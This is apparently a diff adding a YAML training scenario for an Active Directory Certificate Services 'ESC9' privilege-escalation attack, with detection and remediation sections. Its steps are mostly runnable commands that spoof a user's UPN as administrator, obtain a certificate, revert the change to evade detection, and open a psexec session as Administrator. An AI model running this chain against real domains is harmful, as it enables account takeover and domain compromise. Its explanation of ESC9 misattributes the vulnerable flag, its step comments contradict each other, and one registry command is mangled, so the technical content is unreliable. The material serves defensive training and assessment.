@@ -1,0 +1,191 @@
+# Category: Active Directory - AD CS Attacks
+name: "AD CS ESC9 — No Security Extension / Certificate Mapping Abuse"
+id: "ad-adcs-esc9-001"
+category: "active_directory"
+subcategory: "ad_cs_attacks"
+difficulty: "expert"
+estimated_time: "120 minutes"
+
+description: |
+  Exploit Active Directory Certificate Services (AD CS) when the
+  msPKI-Certificate-Name-Flag attribute does not include the
+  CT_FLAG_SUBJECT_ALT_REQUIRE_DOMAIN_DNS flag (No Security Extension).
+  This allows an attacker with GenericWrite on a user account to obtain
+  a certificate for that user and authenticate as them, even if the user's
+  UserPrincipalName does not match the certificate Subject Alternative Name.
+  Combined with weak certificate mapping (ESC9), this enables UPN spoofing
+  and privilege escalation.
+
+learning_objectives:
+  - Understand certificate mapping and UPN validation in AD
+  - Identify templates without CT_FLAG_SUBJECT_ALT_REQUIRE_DOMAIN_DNS
+  - Abuse GenericWrite on user accounts for certificate-based impersonation
+  - Map ESC9 to certificate mapping vulnerabilities and UPN spoofing
+
+tools:
+  - certipy
+  - certify
+  - rubeus
+  - impacket
+  - powersploit
+  - bloodhound
+
+prerequisites:
+  - Valid low-privilege domain credentials
+  - GenericWrite permission on a target user account
+  - Target certificate template without CT_FLAG_SUBJECT_ALT_REQUIRE_DOMAIN_DNS
+  - Certificate mapping configured with weak validation (UPN mapping)
+  - Network access to AD CS CA (TCP 443 or 135)
+
+steps:
+  - id: "step1"
+    phase: "reconnaissance"
+    action: "Enumerate certificate templates for ESC9 vulnerability"
+    commands:
+      - "# Install Certipy"
+      - "pip3 install certipy-ad"
+      - "# Full enumeration"
+      - "certipy find -u '[username]@[domain]' -p '[password]' -dc-ip [dc_ip] -vulnerable -stdout"
+      - "# Look for ESC9 specifically"
+      - "certipy find -u '[username]@[domain]' -p '[password]' -dc-ip [dc_ip] | grep -E '(ESC9|No Security Extension|CT_FLAG_SUBJECT_ALT_REQUIRE_DOMAIN_DNS)'"
+      - "# Check certificate mapping configuration"
+      - "certutil -config '[ca_server]\\[ca_name]' -getreg 'policy\RequestDisposition'"
+    expected_output: "Templates without CT_FLAG_SUBJECT_ALT_REQUIRE_DOMAIN_DNS flagged as ESC9"
+    detection: "LDAP queries for certificate template flags; certipy execution"
+
+  - id: "step2"
+    phase: "enumeration"
+    action: "Identify users with GenericWrite and check certificate mapping"
+    commands:
+      - "# Find users where you have GenericWrite using BloodHound"
+      - "bloodhound-python -u '[username]' -p '[password]' -d [domain] -dc [dc_ip] -c All"
+      - "# Query for GenericWrite using PowerView"
+      - "Get-DomainObjectAcl -Identity '[target_user]' | Where-Object { $_.ActiveDirectoryRights -match 'GenericWrite' }"
+      - "# Check certificate mapping settings on the domain"
+      - "# Check if strong certificate mapping is enforced (KB5014754)"
+      - "# CertificateMappingMethods registry value"
+      - "reg query \\ '[dc_ip]' \ 'HKLM\SYSTEM\CurrentControlSet\Services\Kdc' /v CertificateMappingMethods"
+      - "# Check if UPN mapping is enabled (weak)"
+      - "# Strong certificate mapping requires CT_FLAG_SUBJECT_ALT_REQUIRE_DOMAIN_DNS"
+    expected_output: "Users with GenericWrite permissions and certificate mapping configuration"
+    detection: "BloodHound collection; ACL enumeration on user accounts"
+
+  - id: "step3"
+    phase: "exploitation"
+    action: "Modify target user's UPN (requires GenericWrite)"
+    commands:
+      - "# Change the target user's UPN to match a privileged account"
+      - "# This requires GenericWrite on the user object"
+      - "python3 -c \"
+      - "import ldap3"
+      - "server = ldap3.Server('[dc_ip]')"
+      - "conn = ldap3.Connection(server, user='[username]@[domain]', password='[password]', auto_bind=True)"
+      - "conn.modify('CN=[target_user],CN=Users,DC=[dc1],DC=[dc2]', {'userPrincipalName': [(ldap3.MODIFY_REPLACE, ['administrator@[domain]'])]})"
+      - "print(conn.result)"
+      - """
+      - "# Or using PowerShell"
+      - "Set-ADUser -Identity '[target_user]' -UserPrincipalName 'administrator@[domain]'"
+      - "# Verify the UPN change"
+      - "Get-ADUser -Identity '[target_user]' -Properties UserPrincipalName"
+    expected_output: "Target user's UPN changed to match privileged account"
+    detection: "User UPN modification (Event ID 5136 for userPrincipalName)"
+
+  - id: "step4"
+    phase: "exploitation"
+    action: "Request certificate for the modified user"
+    commands:
+      - "# Request certificate with the vulnerable template"
+      - "certipy req -u '[target_user]@[domain]' -p '[target_password]' -dc-ip [dc_ip] -target [ca_server] -ca '[ca_name]' -template '[vulnerable_template]'"
+      - "# The certificate will have the UPN of 'administrator@[domain]'"
+      - "# But is issued to the target user's identity"
+      - "# Verify the certificate"
+      - "openssl pkcs12 -in [target_user].pfx -nodes -passin pass: | openssl x509 -noout -text | grep -A5 'Subject Alternative Name'"
+    expected_output: "[target_user].pfx containing certificate with Administrator UPN SAN"
+    detection: "Certificate request for user with recently modified UPN"
+
+  - id: "step5"
+    phase: "exploitation"
+    action: "Restore original UPN and authenticate with certificate"
+    commands:
+      - "# Restore the original UPN to avoid detection"
+      - "Set-ADUser -Identity '[target_user]' -UserPrincipalName '[original_upn]'"
+      - "# Authenticate with the certificate (certificate still has old UPN)"
+      - "certipy auth -pfx [target_user].pfx -dc-ip [dc_ip]"
+      - "# If certificate mapping is weak (UPN-based), this authenticates as Administrator"
+      - "# Use the resulting TGT"
+      - "export KRB5CCNAME=administrator.ccache"
+      - "impacket-psexec -k -no-pass [domain]/Administrator@[dc_ip]"
+    expected_output: "TGT for Administrator account via certificate UPN spoofing"
+    detection: "Kerberos authentication with certificate having mismatched UPN and identity"
+
+compliance_controls:
+  - standard: "MITRE ATT&CK"
+    control: "T1649"
+    description: "Steal or Forge Authentication Certificates"
+  - standard: "MITRE ATT&CK"
+    control: "T1098"
+    description: "Account Manipulation"
+  - standard: "NIST 800-53 Rev5"
+    control: "IA-5"
+    description: "Authenticator management"
+  - standard: "CIS Controls v8"
+    control: "6.8"
+    description: "Define and maintain role-based access control"
+
+detection:
+  network_indicators:
+    - "Certificate requests for users with recently modified UPNs"
+    - "UPN modifications followed by certificate enrollment"
+  log_indicators:
+    - "Event ID 5136 (AD): userPrincipalName attribute modified"
+    - "Event ID 4886 (CA): Certificate requested after UPN change"
+    - "Event ID 4768: Kerberos TGT with certificate having spoofed UPN"
+    - "Defender for Identity: Suspicious UPN modification and certificate usage"
+  endpoint_indicators:
+    - "User UPN modifications from non-admin accounts"
+    - "Certificate enrollment immediately after UPN changes"
+    - "Certipy auth with certificates having mismatched identities"
+
+remediation:
+  immediate:
+    - "Enable CT_FLAG_SUBJECT_ALT_REQUIRE_DOMAIN_DNS on all certificate templates"
+    - "Enable strong certificate mapping (KB5014754) on all domain controllers"
+    - "Set CertificateMappingMethods to require strong mapping"
+    - "Audit and remove GenericWrite permissions from non-admin users on user accounts"
+    - "Monitor for UPN modifications"
+  long_term:
+    - "Implement certificate template security flag baselines"
+    - "Deploy regular audits for dangerous ACLs on user accounts"
+    - "Use strong certificate mapping with SID validation"
+    - "Consider disabling UPN-based certificate mapping"
+    - "Monitor for certificate requests with mismatched UPN and identity"
+
+variables:
+  domain: "corp.example.com"
+  dc1: "corp"
+  dc2: "example"
+  dc_ip: "192.168.1.10"
+  username: "jsmith"
+  password: "Password123"
+  target_user: "jsmith"
+  target_password: "Password123"
+  original_upn: "jsmith@corp.example.com"
+  ca_server: "ca01.corp.example.com"
+  ca_name: "corp-CA01-CA"
+  vulnerable_template: "UserTemplateNoSecurityExt"
+
+assessment_questions:
+  - "What is the CT_FLAG_SUBJECT_ALT_REQUIRE_DOMAIN_DNS flag and why is it important?"
+  - "How does weak certificate mapping enable ESC9 attacks?"
+  - "What permission is required to perform an ESC9 attack?"
+  - "How does strong certificate mapping (KB5014754) prevent ESC9?"
+
+references:
+  - url: "https://github.com/ly4k/Certipy"
+    title: "Certipy - AD CS Attack Tool"
+  - url: "https://posts.specterops.io/certified-pre-owned-d95910965cd2"
+    title: "Certified Pre-Owned - SpecterOps"
+  - url: "https://support.microsoft.com/en-us/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c9b15-0985-4a2e-8e2d-437ad2a0c2ef"
+    title: "KB5014754 - Certificate-based authentication changes"
+  - url: "https://attack.mitre.org/techniques/T1649/"
+    title: "MITRE ATT&CK - Steal or Forge Authentication Certificates"
